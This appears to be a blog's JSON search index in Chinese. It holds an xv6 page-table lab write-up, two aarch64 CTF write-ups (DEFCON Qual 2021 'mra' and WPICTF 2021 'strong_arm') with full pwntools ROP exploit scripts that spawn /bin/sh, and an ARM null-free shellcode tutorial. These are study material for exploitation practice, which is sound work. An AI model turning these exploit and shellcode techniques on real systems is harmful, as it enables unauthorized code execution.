[{"categories":["6.s081-lab"],"content":"做到这个 lab 的时候跳着看了一下 xv6-book 第三章和代码就开始上手，结果当然是跑不起来。最后还是倒回去重新认真分析了相关代码。 ","date":"2021-11-19","objectID":"/xv6-lab-pgtbl/:0:0","tags":["6.s081","kernel","lab","xv6"],"title":"Xv6 Lab Pgtbl: Pagetable Per Process","uri":"/xv6-lab-pgtbl/"},{"categories":["6.s081-lab"],"content":"页表硬件 pagetable_t (kernel/riscv.h) 页表指针，指向内存页的起始位置。 typedef uint64 *pagetable_t; pte_t (kernel/riscv.h) Page Table Entry, 页表表项，由 PPN (Physical Page Number) 和 Flags 组成。Flags 为页权限标志。 typedef uint64 pte_t; 内存页大小为 4096 Bytes，PTE 为 8 Bytes。因此可计算出 pagetable_t 指向的页表可包含 512 个表项。 xv6 采用 Sv39 RISC-V。这意味着它只使用地址的低 39 位。其中低 12 位为页哪偏移 (2 ^ 12 == 4096)。剩余 27 位用于三级页表，每 9 位可以定位一个页表中的表项。三级页表中最高级的页表中的表项存储了第二级的地址，第二级页表储存最低级的地址。最终由最低级页表中表项的 44 位 PPN 和 虚拟地址的低 12 位构成物理地址。 kernel/riskv.h 中定义了关于页表的宏 #define PGSIZE 4096 // bytes per page #define PGSHIFT 12 // bits of offset within a page #define PGROUNDUP(sz) (((sz)+PGSIZE-1) \u0026 ~(PGSIZE-1)) #define PGROUNDDOWN(a) (((a)) \u0026 ~(PGSIZE-1)) #define PTE_V (1L \u003c\u003c 0) // valid #define PTE_R (1L \u003c\u003c 1) #define PTE_W (1L \u003c\u003c 2) #define PTE_X (1L \u003c\u003c 3) #define PTE_U (1L \u003c\u003c 4) // 1 -\u003e user can access // shift a physical address to the right place for a PTE. #define PA2PTE(pa) ((((uint64)pa) \u003e\u003e 12) \u003c\u003c 10) #define PTE2PA(pte) (((pte) \u003e\u003e 10) \u003c\u003c 12) #define PTE_FLAGS(pte) ((pte) \u0026 0x3FF) // extract the three 9-bit page table indices from a virtual address. #define PXMASK 0x1FF // 9 bits #define PXSHIFT(level) (PGSHIFT+(9*(level))) #define PX(level, va) ((((uint64) (va)) \u003e\u003e PXSHIFT(level)) \u0026 PXMASK) // one beyond the highest possible virtual address. // MAXVA is actually one bit less than the max allowed by // Sv39, to avoid having to sign-extend virtual addresses // that have the high bit set. #define MAXVA (1L \u003c\u003c (9 + 9 + 9 + 12 - 1)) ","date":"2021-11-19","objectID":"/xv6-lab-pgtbl/:1:0","tags":["6.s081","kernel","lab","xv6"],"title":"Xv6 Lab Pgtbl: Pagetable Per Process","uri":"/xv6-lab-pgtbl/"},{"categories":["6.s081-lab"],"content":"Kernel 地址空间 Qemu 将 DRAM 映射在 0x80000000 到 0x86400000。其它设备映射在低于 0x80000000 的地址空间。Xv6 对 kernel 进行直接映射，即虚拟地址和物理地址相同。 有一部分虚拟地址并不是直接映射的。 trampoline page 被映射在地址空间的顶部。并且它被映射了两次，另一次为直接映射。 进程的 kernel stack 也被映射在高地址空间，并且用 guard page 防止栈溢出。 kernel text 和 trampoline 的权限为 PTE_R | PTE_X，其余为 PTE_R | PTE_W 。 kernel/memlayout.h 中定义了地址空间相关的常量。 // Physical memory layout // qemu -machine virt is set up like this, // based on qemu's hw/riscv/virt.c: // // 00001000 -- boot ROM, provided by qemu // 02000000 -- CLINT // 0C000000 -- PLIC // 10000000 -- uart0 // 10001000 -- virtio disk // 80000000 -- boot ROM jumps here in machine mode // -kernel loads the kernel here // unused RAM after 80000000. // the kernel uses physical memory thus: // 80000000 -- entry.S, then kernel text and data // end -- start of kernel page allocation area // PHYSTOP -- end RAM used by the kernel // qemu puts UART registers here in physical memory. #define UART0 0x10000000L #define UART0_IRQ 10 // virtio mmio interface #define VIRTIO0 0x10001000 #define VIRTIO0_IRQ 1 // local interrupt controller, which contains the timer. #define CLINT 0x2000000L #define CLINT_MTIMECMP(hartid) (CLINT + 0x4000 + 8*(hartid)) #define CLINT_MTIME (CLINT + 0xBFF8) // cycles since boot. // qemu puts programmable interrupt controller here. #define PLIC 0x0c000000L #define PLIC_PRIORITY (PLIC + 0x0) #define PLIC_PENDING (PLIC + 0x1000) #define PLIC_MENABLE(hart) (PLIC + 0x2000 + (hart)*0x100) #define PLIC_SENABLE(hart) (PLIC + 0x2080 + (hart)*0x100) #define PLIC_MPRIORITY(hart) (PLIC + 0x200000 + (hart)*0x2000) #define PLIC_SPRIORITY(hart) (PLIC + 0x201000 + (hart)*0x2000) #define PLIC_MCLAIM(hart) (PLIC + 0x200004 + (hart)*0x2000) #define PLIC_SCLAIM(hart) (PLIC + 0x201004 + (hart)*0x2000) // the kernel expects there to be RAM // for use by the kernel and user pages // from physical address 0x80000000 to PHYSTOP. #define KERNBASE 0x80000000L #define PHYSTOP (KERNBASE + 128*1024*1024) // map the trampoline page to the highest address, // in both user and kernel space. #define TRAMPOLINE (MAXVA - PGSIZE) // map kernel stacks beneath the trampoline, // each surrounded by invalid guard pages. #define KSTACK(p) (TRAMPOLINE - ((p)+1)* 2*PGSIZE) // User memory layout. // Address zero first: // text // original data and bss // fixed-size stack // expandable heap // ... // TRAPFRAME (p-\u003etrapframe, used by the trampoline) // TRAMPOLINE (the same page as in the kernel) #define TRAPFRAME (TRAMPOLINE - PGSIZE) 创建地址空间的代码主要存在于 kernel/vm.c, kernel/proc.c 和 kernel/main.c。 kernel/vm.c 中定义了 kernel_pagetable，这是 xv6 kernel 使用的 pagetable。 /* * the kernel's page table. */ pagetable_t kernel_pagetable; walk 函数返回虚拟地址对应的 PTE。在 for 循环中处理三级页表，如果页表不存在则创建。 // Return the address of the PTE in page table pagetable // that corresponds to virtual address va. If alloc!=0, // create any required page-table pages. // // The risc-v Sv39 scheme has three levels of page-table // pages. A page-table page contains 512 64-bit PTEs. // A 64-bit virtual address is split into five fields: // 39..63 -- must be zero. // 30..38 -- 9 bits of level-2 index. // 21..29 -- 9 bits of level-1 index. // 12..20 -- 9 bits of level-0 index. // 0..11 -- 12 bits of byte offset within the page. pte_t * walk(pagetable_t pagetable, uint64 va, int alloc) { if(va \u003e= MAXVA) panic(\"walk\"); for(int level = 2; level \u003e 0; level--) { pte_t *pte = \u0026pagetable[PX(level, va)]; if(*pte \u0026 PTE_V) { pagetable = (pagetable_t)PTE2PA(*pte); } else { if(!alloc || (pagetable = (pde_t*)kalloc()) == 0) return 0; memset(pagetable, 0, PGSIZE); *pte = PA2PTE(pagetable) | PTE_V; } } return \u0026pagetable[PX(0, va)]; } mappages 在页表的 PTE 中写入 pa。kvmmap 套了个壳。 // Create PTEs for virtual addresses starting at va that refer to // physical addresses starting at pa. va and size might not // be page-aligned. Returns 0 on success, -1 if walk() couldn't // allocate a needed page-table page. int mappages(pagetable_t pagetable, uint64 va, uint64 size, uint64 pa, int perm) { uint64 a, last; pte_t *pte; a = P","date":"2021-11-19","objectID":"/xv6-lab-pgtbl/:2:0","tags":["6.s081","kernel","lab","xv6"],"title":"Xv6 Lab Pgtbl: Pagetable Per Process","uri":"/xv6-lab-pgtbl/"},{"categories":["6.s081-lab"],"content":"物理内存分配 kernel/main.c 中 main 调用 kinit 对 allocator 进行初始化，它将 kernel 之后的内存空间按页为单位维护成一个 freelist\u0010，可以看出 freelist 是一个 LIFO 的链表。 struct run { struct run *next; }; struct { struct spinlock lock; struct run *freelist; } kmem; void kinit() { initlock(\u0026kmem.lock, \"kmem\"); freerange(end, (void*)PHYSTOP); } void freerange(void *pa_start, void *pa_end) { char *p; p = (char*)PGROUNDUP((uint64)pa_start); for(; p + PGSIZE \u003c= (char*)pa_end; p += PGSIZE) kfree(p); } // Free the page of physical memory pointed at by v, // which normally should have been returned by a // call to kalloc(). (The exception is when // initializing the allocator; see kinit above.) void kfree(void *pa) { struct run *r; if(((uint64)pa % PGSIZE) != 0 || (char*)pa \u003c end || (uint64)pa \u003e= PHYSTOP) panic(\"kfree\"); // Fill with junk to catch dangling refs. memset(pa, 1, PGSIZE); r = (struct run*)pa; acquire(\u0026kmem.lock); r-\u003enext = kmem.freelist; kmem.freelist = r; release(\u0026kmem.lock); } ","date":"2021-11-19","objectID":"/xv6-lab-pgtbl/:3:0","tags":["6.s081","kernel","lab","xv6"],"title":"Xv6 Lab Pgtbl: Pagetable Per Process","uri":"/xv6-lab-pgtbl/"},{"categories":["6.s081-lab"],"content":"进程地址空间 ","date":"2021-11-19","objectID":"/xv6-lab-pgtbl/:4:0","tags":["6.s081","kernel","lab","xv6"],"title":"Xv6 Lab Pgtbl: Pagetable Per Process","uri":"/xv6-lab-pgtbl/"},{"categories":["6.s081-lab"],"content":"A kernel page table per process (hard) diff --git a/kernel/defs.h b/kernel/defs.h index ebc4cad..32bcbff 100644 --- a/kernel/defs.h +++ b/kernel/defs.h @@ -92,6 +92,7 @@ int fork(void); int growproc(int); pagetable_t proc_pagetable(struct proc *); void proc_freepagetable(pagetable_t, uint64); +void proc_free_kernel_pagetable(pagetable_t); int kill(int); struct cpu* mycpu(void); struct cpu* getmycpu(void); @@ -179,6 +180,8 @@ int copyout(pagetable_t, uint64, char *, uint64); int copyin(pagetable_t, char *, uint64, uint64); int copyinstr(pagetable_t, char *, uint64, uint64); void vmprint(pagetable_t); +pagetable_t proc_kvminit(void); +pagetable_t global_kernel_pagetable(void); // plic.c void plicinit(void); diff --git a/kernel/proc.c b/kernel/proc.c index dab1e1d..f7f5ef6 100644 --- a/kernel/proc.c +++ b/kernel/proc.c @@ -107,6 +107,14 @@ allocproc(void) found: p-\u003epid = allocpid(); + // Prepare kernel page table. + p-\u003ekernel_pagetable = proc_kvminit(); + + // map stack + uint64 va = KSTACK((int) (p - proc)); + uint64 pa = kvmpa(va); + mappages(p-\u003ekernel_pagetable, va, PGSIZE, pa, PTE_R | PTE_W); + // Allocate a trapframe page. if((p-\u003etrapframe = (struct trapframe *)kalloc()) == 0){ release(\u0026p-\u003elock); @@ -141,7 +149,10 @@ freeproc(struct proc *p) p-\u003etrapframe = 0; if(p-\u003epagetable) proc_freepagetable(p-\u003epagetable, p-\u003esz); + if(p-\u003ekernel_pagetable) + proc_free_kernel_pagetable(p-\u003ekernel_pagetable); p-\u003epagetable = 0; + p-\u003ekernel_pagetable = 0; p-\u003esz = 0; p-\u003epid = 0; p-\u003eparent = 0; @@ -195,6 +206,25 @@ proc_freepagetable(pagetable_t pagetable, uint64 sz) uvmfree(pagetable, sz); } +// Free a process's kernel page table only, not the physical memory. +void +proc_free_kernel_pagetable(pagetable_t pagetable) +{ + // there are 2^9 = 512 PTEs in a page table. + for(int i = 0; i \u003c 512; i++){ + pte_t pte = pagetable[i]; + if((pte \u0026 PTE_V) \u0026\u0026 (pte \u0026 (PTE_R|PTE_W|PTE_X)) == 0){ + // this PTE points to a lower-level page table. + uint64 child = PTE2PA(pte); + proc_free_kernel_pagetable((pagetable_t)child); + pagetable[i] = 0; + } else if(pte \u0026 PTE_V){ + continue; + } + } + kfree((void*)pagetable); +} + // a user program that calls exec(\"/init\") // od -t xC initcode uchar initcode[] = { @@ -473,6 +503,11 @@ scheduler(void) // before jumping back to us. p-\u003estate = RUNNING; c-\u003eproc = p; + + // Switch kernel page table + w_satp(MAKE_SATP(p-\u003ekernel_pagetable)); + sfence_vma(); + swtch(\u0026c-\u003econtext, \u0026p-\u003econtext); // Process is done running for now. @@ -483,6 +518,13 @@ scheduler(void) } release(\u0026p-\u003elock); } + + // Switch to global kernel page table when no process is running. + if (found == 0) { + w_satp(MAKE_SATP(global_kernel_pagetable())); + sfence_vma(); + } + #if !defined (LAB_FS) if(found == 0) { intr_on(); diff --git a/kernel/proc.h b/kernel/proc.h index 9c16ea7..0811f03 100644 --- a/kernel/proc.h +++ b/kernel/proc.h @@ -98,6 +98,7 @@ struct proc { uint64 kstack; // Virtual address of kernel stack uint64 sz; // Size of process memory (bytes) pagetable_t pagetable; // User page table + pagetable_t kernel_pagetable; struct trapframe *trapframe; // data page for trampoline.S struct context context; // swtch() here to run process struct file *ofile[NOFILE]; // Open files diff --git a/kernel/vm.c b/kernel/vm.c index 699ca26..b7073e9 100644 --- a/kernel/vm.c +++ b/kernel/vm.c @@ -47,6 +47,43 @@ kvminit() kvmmap(TRAMPOLINE, (uint64)trampoline, PGSIZE, PTE_R | PTE_X); } +pagetable_t +global_kernel_pagetable() +{ + return kernel_pagetable; +} + +pagetable_t +proc_kvminit() +{ + pagetable_t kernel_pagetable = (pagetable_t) kalloc(); + memset(kernel_pagetable, 0, PGSIZE); + + // uart registers + mappages(kernel_pagetable, UART0, PGSIZE, UART0, PTE_R | PTE_W); + + // virtio mmio disk interface + mappages(kernel_pagetable, VIRTIO0, PGSIZE, VIRTIO0, PTE_R | PTE_W); + + // CLINT + mappages(kernel_pagetable, CLINT, 0x10000, CLINT, PTE_R | PTE_W); + + // PLIC + mappages(kernel_pagetable, PLIC, 0x400000, PLIC, PTE_R | PTE_W); + + // map kernel text executable an","date":"2021-11-19","objectID":"/xv6-lab-pgtbl/:5:0","tags":["6.s081","kernel","lab","xv6"],"title":"Xv6 Lab Pgtbl: Pagetable Per Process","uri":"/xv6-lab-pgtbl/"},{"categories":["pwn"],"content":"功能分析 程序是静态链接，并且去掉了符号信息。 $ file mra mra: ELF 64-bit LSB executable, ARM aarch64, version 1 (SYSV), statically linked, stripped 题目描述是 Is it odd?，用 IDA 打开发现栈帧分析会出错，看函数序发现栈是向上生长的，确实挺 odd。IDA 没法使用，看了 Writeup 发现可以用 Ghidra。 undefined8 main(undefined4 param_1,undefined8 param_2) { uint uVar1; uint uVar2; int iVar3; undefined *puVar4; undefined *puVar5; ulong uVar6; long lVar7; undefined8 uStack0000000000000010; undefined4 uStack000000000000001c; undefined8 in_stack_00000020; char cVar8; char *pcVar9; char *pcVar10; char *pcVar11; uStack0000000000000010 = param_2; uStack000000000000001c = param_1; FUN_00401018(PTR_DAT_0041cf60,0,2,0); FUN_00401018(PTR_FUN_0041cf58,0,2,0); pcVar10 = \"GET /api/isodd/\"; pcVar9 = \"Buy isOddCoin, the hottest new cryptocurrency!\"; cVar8 = '\\0'; FUN_00405ba0(\u0026stack0x00000028,0,0x400); pcVar11 = \"public\"; uVar2 = FUN_004064f8(0,\u0026stack0x00000028,0x3ff); if ((8 \u003c uVar2) \u0026\u0026 (iVar3 = FUN_00405eb0(\u0026stack0x00000028,pcVar10,0xf), iVar3 == 0)) { puVar4 = (undefined *)FUN_00405ca8(\u0026stack0x00000028,10); if (puVar4 != (undefined *)0x0) { *puVar4 = 0; if (puVar4[-1] == '\\r') { puVar4[-1] = '\\0'; } } puVar4 = (undefined *)FUN_00406358(\u0026stack0x00000028,\" HTTP/\"); if (puVar4 != (undefined *)0x0) { *puVar4 = 0; } puVar4 = (undefined *)FUN_00405ca8(\u0026stack0x00000028,0x3f); if (puVar4 != (undefined *)0x0) { *puVar4 = 0; puVar4 = puVar4 + 1; iVar3 = FUN_00405eb0(puVar4,\"token=\",6); if (iVar3 == 0) { pcVar11 = puVar4 + 6; } } puVar4 = \u0026stack0x00000037; puVar5 = (undefined *)FUN_00405ca8(puVar4,0x2f); if (puVar5 != (undefined *)0x0) { *puVar5 = 0; } uVar6 = FUN_00405e28(puVar4); iVar3 = FUN_00405de0(pcVar11,\"enterprise\"); if (iVar3 == 0) { if (0xc \u003c uVar6) { FUN_004002c4(0x191,\"{\\n\\t\\\"error\\\": \\\"contact us for unlimited large number support\\\"\\n}\"); return 0; } } else { iVar3 = FUN_00405de0(pcVar11,\"premium\"); if (iVar3 == 0) { if (9 \u003c uVar6) { FUN_004002c4(0x191, \"{\\n\\t\\\"error\\\": \\\"sign up for enterprise to get large number support\\\"\\n}\"); return 0; } } else { pcVar11 = \"public\"; if (6 \u003c uVar6) { FUN_004002c4(0x191, \"{\\n\\t\\\"error\\\": \\\"sign up for premium or enterprise to get large number support\\\"\\n}\" ); return 0; } } } iVar3 = FUN_004001d0(\u0026stack0x00000428,puVar4); lVar7 = (long)iVar3; if ((cVar8 == '-') \u0026\u0026 (iVar3 = FUN_00405de0(pcVar11,\"public\"), iVar3 == 0)) { FUN_004002c4(0x191, \"{\\n\\t\\\"error\\\": \\\"sign up for premium or enterprise to get negative number support\\\"\\n}\" ); } else { uVar2 = (byte)(\u0026stack0x00000427)[lVar7] - 0x30; in_stack_00000020 = 0; iVar3 = FUN_00405de0(pcVar11,\"public\"); if (iVar3 == 0) { uVar1 = -(uVar2 \u0026 1); if (-1 \u003c (int)uVar2) { uVar1 = uVar2 \u0026 1; } if (uVar1 == 1) { pcVar11 = \"true\"; } else { pcVar11 = \"false\"; } FUN_00400d88(\u0026stack0x00000020,\"{\\n\\t\\\"isodd\\\": %s,\\n\\t\\\"ad\\\": \\\"%s\\\"\\n}\\n\",pcVar11,pcVar9); } else { uVar1 = -(uVar2 \u0026 1); if (-1 \u003c (int)uVar2) { uVar1 = uVar2 \u0026 1; } if (uVar1 == 1) { pcVar11 = \"true\"; } else { pcVar11 = \"false\"; } FUN_00400d88(\u0026stack0x00000020,\"{\\n\\t\\\"isodd\\\": %s\\n}\\n\",pcVar11); } FUN_004002c4(200,in_stack_00000020); } } return 0; } 因为是静态链接并且去掉了符号，看起来非常头疼，不过可以根据正向编程经验确定一些函数，比如在 main 开头处有 FUN_00401018(PTR_DAT_0041cf60,0,2,0); FUN_00401018(PTR_FUN_0041cf58,0,2,0); pcVar10 = \"GET /api/isodd/\"; pcVar9 = \"Buy isOddCoin, the hottest new cryptocurrency!\"; cVar8 = '\\0'; FUN_00405ba0(\u0026stack0x00000028,0,0x400); pcVar11 = \"public\"; uVar2 = FUN_004064f8(0,\u0026stack0x00000028,0x3ff); 根据经验不难猜到是 setvbuf，memset 和 read 三个操作。用类似的方法可以得到以下代码： undefined8 main(undefined4 param_1,undefined8 param_2) { uint uVar1; uint uVar2; int iVar3; undefined *puVar4; undefined *puVar5; ulong uVar6; long lVar7; undefined8 uStack0000000000000010; undefined4 uStack000000000000001c; undefined8 in_stack_00000020; char cVar8; char *pcVar9; char *pcVar10; char *pcVar11; uStack0000000000000010 = param_2; uStack000000000000001c = param_1; setvbuf(PTR_DAT_0041cf60,0,2,0); setvbuf(PTR_FUN_0041cf58,0,2,0); pcVar10 = \"GET /api/isodd/\"; pcVar9 = \"Buy isOddCoin, the hottest new cryptocurrency!\"; cVar8 = '\\0'; memset(\u0026stack0x0000002","date":"2021-07-28","objectID":"/defon-qual-2021-mra/:1:0","tags":["aarch64","rop","pwn","arm"],"title":"Defon Qual 2021 Mra","uri":"/defon-qual-2021-mra/"},{"categories":["pwn"],"content":"寻找漏洞 用上述方法分析后，我尝试了很久都没能找到漏洞。于是又参考了 Writeup，发现漏洞在 FUN_004001d0 函数中。这里我根据程序逻辑直接把它当作库函数 strcpy 因此没有深入分析。其实正确的做法是根据程序逻辑和函数自身的代码确定它的功能。 int vuln_cpy(long param_1,long param_2) { uint uVar1; long lStack0000000000000020; long lStack0000000000000028; byte bStack0000000000000037; int iStack0000000000000038; int iStack000000000000003c; iStack000000000000003c = 0; iStack0000000000000038 = 0; lStack0000000000000020 = param_2; lStack0000000000000028 = param_1; while (bStack0000000000000037 = *(byte *)(lStack0000000000000020 + iStack000000000000003c), bStack0000000000000037 != 0) { if (bStack0000000000000037 == '%') { uVar1 = FUN_00400144(*(undefined *)(lStack0000000000000020 + (long)iStack000000000000003c + 1) ); bStack0000000000000037 = FUN_00400144(*(undefined *)(lStack0000000000000020 + (long)iStack000000000000003c + 2)); bStack0000000000000037 = (byte)((uVar1 \u0026 0xff) \u003c\u003c 4) | bStack0000000000000037; iStack000000000000003c = iStack000000000000003c + 3; } else { iStack000000000000003c = iStack000000000000003c + 1; } *(byte *)(lStack0000000000000028 + iStack0000000000000038) = bStack0000000000000037; iStack0000000000000038 = iStack0000000000000038 + 1; } return iStack0000000000000038; } vuln_cpy 用于将字符串从源地址拷贝到目的地址，遇到 % 后会把接下来两个字符作为 16 进制读取，并进行一个 url decode 的操作。不难发现这个函数不会被 %\\x00 这样的模式截断，这样就会绕过 main 中的长度检查造成栈溢出漏洞。 ","date":"2021-07-28","objectID":"/defon-qual-2021-mra/:2:0","tags":["aarch64","rop","pwn","arm"],"title":"Defon Qual 2021 Mra","uri":"/defon-qual-2021-mra/"},{"categories":["pwn"],"content":"漏洞利用 $ checksec ./mra [*] '/mnt/c/Users/ay3/Desktop/Archive/ooo/mra/mra' Arch: aarch64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 找到可用的 gadget： $ aarch64-linux-gnu-objdump -d mra | grep -B10 -A5 svc ... 4007b4: f85f83e8 ldur x8, [sp, #-8] 4007b8: f85f03e0 ldur x0, [sp, #-16] 4007bc: f85e83e1 ldur x1, [sp, #-24] 4007c0: f85e03e2 ldur x2, [sp, #-32] 4007c4: d4000001 svc #0x0 4007c8: d10083ff sub sp, sp, #0x20 4007cc: d65f03c0 ret ... 构造 rop 链如下： rop = p64(0) + p64(0) + p64(binary.bss()) + p64(constants.SYS_execve) rop += p64(8) + p64(binary.bss()) + p64(0) + p64(constants.SYS_read) + b'a' * 8 + p64(gadget) 完整 exp 如下： from pwn import * import urllib context.log_level = 'debug' context.arch = 'aarch64' binary = ELF('./mra') # cmd = 'qemu-aarch64 -g 1234 mra' cmd = 'qemu-aarch64 mra' p = process(cmd.split()) # pause() # 4007b4: f85f83e8 ldur x8, [sp, #-8] # 4007b8: f85f03e0 ldur x0, [sp, #-16] # 4007bc: f85e83e1 ldur x1, [sp, #-24] # 4007c0: f85e03e2 ldur x2, [sp, #-32] # 4007c4: d4000001 svc #0x0 # 4007c8: d10083ff sub sp, sp, #0x20 # 4007cc: d65f03c0 ret gadget = 0x4007b4 # p.sendline(b'GET /api/isodd/%\\x00' + cyclic(0x500) + b'HTTP/1.1') # offset = cyclic_find(p64(0x61616562616164), n=8) rop = p64(0) + p64(0) + p64(binary.bss()) + p64(constants.SYS_execve) rop += p64(8) + p64(binary.bss()) + p64(0) + p64(constants.SYS_read) + b'a' * 8 + p64(gadget) rop = urllib.parse.quote(rop).encode() payload = b'GET /api/isodd/%\\x00' payload += b'a' * 0x28 + rop p.send(payload.ljust(0x3ff, b'a')) sleep(0.1) p.sendline(b'/bin/sh\\x00') p.interactive() ","date":"2021-07-28","objectID":"/defon-qual-2021-mra/:3:0","tags":["aarch64","rop","pwn","arm"],"title":"Defon Qual 2021 Mra","uri":"/defon-qual-2021-mra/"},{"categories":["pwn"],"content":"文件来源: strong_arm ","date":"2021-07-28","objectID":"/wpictf-2021-strong_arm/:0:0","tags":["aarch64","pwn","rop"],"title":"Wpictf 2021 Strong_arm","uri":"/wpictf-2021-strong_arm/"},{"categories":["pwn"],"content":"环境搭建 安装 qemu-user，libc 和 binutils： $ sudo apt install qemu-user libc6-arm64-cross binutils-aarch64-linux-gnu 发现交叉编译工具链里没有 ldd，可以用 readelf 替代： $ aarch64-linux-gnu-readelf -a arm | grep 'library' 0x0000000000000001 (NEEDED) Shared library: [libc.so.6] 查找 gadget： $ ropper --nocolor --file /usr/aarch64-linux-gnu/lib/libc.so.6 \u003e gadget $ cat gadget | grep ': ldr x0.*; ldp x29, x30, \\[sp\\], #0x[0-9a-f]*; ret; $' ","date":"2021-07-28","objectID":"/wpictf-2021-strong_arm/:1:0","tags":["aarch64","pwn","rop"],"title":"Wpictf 2021 Strong_arm","uri":"/wpictf-2021-strong_arm/"},{"categories":["pwn"],"content":"漏洞分析 非常明显的栈溢出漏洞。但需要注意的是 Aarch64 的函数调用栈栈帧结构与 x86 不同。以该题 main 栈帧为例，x29 和 x30 分别是栈基址寄存器和 lr 。可以看到这两个寄存器的值保存在栈顶，然后才是局部变量。栈帧结构与 x86 正好是相反的。因此发生栈溢出的时候能够修改的是 caller 的返回地址。 .text:00000000004006B0 STP X29, X30, [SP,#var_20]! .text:00000000004006B4 MOV X29, SP .text:00000000004006B8 STR W0, [X29,#0x20+var_4] .text:00000000004006BC STR X1, [X29,#0x20+var_10] .text:00000000004006C0 ADRP X0, #printf_ptr@PAGE .text:00000000004006C4 LDR X1, [X0,#printf_ptr@PAGEOFF] .text:00000000004006C8 ADRL X0, aPrintAtP ; \"print at %p\\n\" .text:00000000004006D0 BL .printf .text:00000000004006D4 BL vulnerable .text:00000000004006D8 MOV W0, #0 .text:00000000004006DC LDP X29, X30, [SP+0x20+var_20],#0x20 .text:00000000004006E0 RET 由于 ret 指令不从栈上取返回地址，而是从 x30 取，因此 rop chain 的构造比 x86 要困难一些。 # ldr x0, [sp, #0x18]; ldp x29, x30, [sp], #0x20; ret; gadget = 0x0000000000063e1c payload = b'a' * 0x88 + p64(gadget + libc.address) + b'a' * 0x18 + p64(libc.sym.system) + b'a' * 0x8 + p64(next(libc.search(b'/bin/sh'))) 这里使用的 libc 是 2.31 版本，不过构造方法应该都是一致的。首先填充 vuln 函数的局部变量空间以及 x29 然后是我们的 gadget，然后填充 main 的局部变量空间。在 main 退出时 sp 指向 payload 中偏移为 0xa0 的位置，因此根据我们的 gadget 需要在 0xb8 的位置填上 /bin/sh 地址，再在栈顶填好 x29 和 x30，就可以调用 system(\"/bin/sh\") 了。 完整 exp 如下： from pwn import * context.log_level = 'debug' binary = ELF('./arm') libc = ELF('/usr/aarch64-linux-gnu/lib/libc.so.6') cmd = 'qemu-aarch64 -L /usr/aarch64-linux-gnu arm' p = process(cmd.split(' ')) # ldr x0, [sp, #0x18]; ldp x29, x30, [sp], #0x20; ret; gadget = 0x0000000000063e1c p.recvuntil('print at ') leak = int(p.recvline()[:-1], 16) libc.address = leak - libc.sym.printf success(hex(libc.address)) payload = b'a' * 0x88 + p64(gadget + libc.address) + b'a' * 0x18 + p64(libc.sym.system) + b'a' * 0x8 + p64(next(libc.search(b'/bin/sh'))) p.sendline(payload) p.interactive() ","date":"2021-07-28","objectID":"/wpictf-2021-strong_arm/:2:0","tags":["aarch64","pwn","rop"],"title":"Wpictf 2021 Strong_arm","uri":"/wpictf-2021-strong_arm/"},{"categories":["pwn"],"content":"之前一直对 Arm pwn 不了解，但 CTF 中 Arm pwn 出现频率还是挺高的。Defcon qual 2021 也有一道比较简单的 Arm pwn。编写 Shellcode 是漏洞利用的基础，因此从它开始入门 Arm pwn。主要参考 wrting arm shellcode, 系统环境是 azeria lab vm 2.0。 ","date":"2021-07-26","objectID":"/arm-pwn-shellcode/:0:0","tags":["arm","shellcode","pwn"],"title":"Arm Pwn Shellcode","uri":"/arm-pwn-shellcode/"},{"categories":["pwn"],"content":"系统调用 一般情况下执行 shellcode 的目的是弹出一个shell，即 execve(\"/bin/sh\", 0, 0)。32 bit arm 系统调用号通过 r7传递，参数依次保存在 r0 - r6。汇编代码如下： .section .text .global _start _start: add r0, pc, #12 mov r1, #0 mov r2, #0 mov r7, #11 svc #0 .ascii \"/bin/sh\\0\" ","date":"2021-07-26","objectID":"/arm-pwn-shellcode/:1:0","tags":["arm","shellcode","pwn"],"title":"Arm Pwn Shellcode","uri":"/arm-pwn-shellcode/"},{"categories":["pwn"],"content":"去除 Null Byte 上面的汇编代码经过汇编后得到的机器指令中含有非常多的 null byte，这对 shellcode 来说是非常致命的。因为漏洞函数往往会被 null byte 截断。 $ objdump -d execv execv: file format elf32-littlearm Disassembly of section .text: 00010054 \u003c_start\u003e: 10054: e28f000c add r0, pc, #12 10058: e3a01000 mov r1, #0 1005c: e3a02000 mov r2, #0 10060: e3a0700b mov r7, #11 10064: ef000000 svc 0x00000000 10068: 6e69622f .word 0x6e69622f 1006c: 0068732f .word 0x0068732f 需要注意的是在 x86 架构下 pc 的值是下一条指令的地址，而在 arm 架构中 pc 的值是下下条指令的地址。 ","date":"2021-07-26","objectID":"/arm-pwn-shellcode/:2:0","tags":["arm","shellcode","pwn"],"title":"Arm Pwn Shellcode","uri":"/arm-pwn-shellcode/"},{"categories":["pwn"],"content":"指令部分 对于指令中的 null byte 可以通过使用 Thumb mode 来去除。 .section .text .global _start _start: .code 32 add r3, pc, #1 bx r3 .code 16 add r0, pc, #8 eor r1, r1, r1 eor r2, r2, r2 mov r7, #11 svc #1 mov r5, r5 .ascii \"/bin/sh\\0\" 其中 mov r5, r5 用于对齐。 ","date":"2021-07-26","objectID":"/arm-pwn-shellcode/:2:1","tags":["arm","shellcode","pwn"],"title":"Arm Pwn Shellcode","uri":"/arm-pwn-shellcode/"},{"categories":["pwn"],"content":"字符串部分 上面的汇编代码得到的机器码是不含 null byte 的，但作为参数的字符串末尾却必须包含一个 null byte。解决方法是先在目标位置存放一个任意非 0 的值，然后在运行时将它置 0。 .section .text .global _start _start: .code 32 add r3, pc, #1 bx r3 .code 16 add r0, pc, #8 eor r1, r1, r1 eor r2, r2, r2 strb r2, [r0, #7] mov r7, #11 svc #1 .ascii \"/bin/shx\" ","date":"2021-07-26","objectID":"/arm-pwn-shellcode/:2:2","tags":["arm","shellcode","pwn"],"title":"Arm Pwn Shellcode","uri":"/arm-pwn-shellcode/"},{"categories":["pwn"],"content":"测试 Shellcode 链接时默认 .text 段不可写，而 /bin/sh 在 .text 段中。使用 -N 使其可写。 ld --help | grep 'readonly' -N, --omagic Do not page align data, do not make text readonly --no-omagic Page align data, make text readonly ","date":"2021-07-26","objectID":"/arm-pwn-shellcode/:3:0","tags":["arm","shellcode","pwn"],"title":"Arm Pwn Shellcode","uri":"/arm-pwn-shellcode/"}]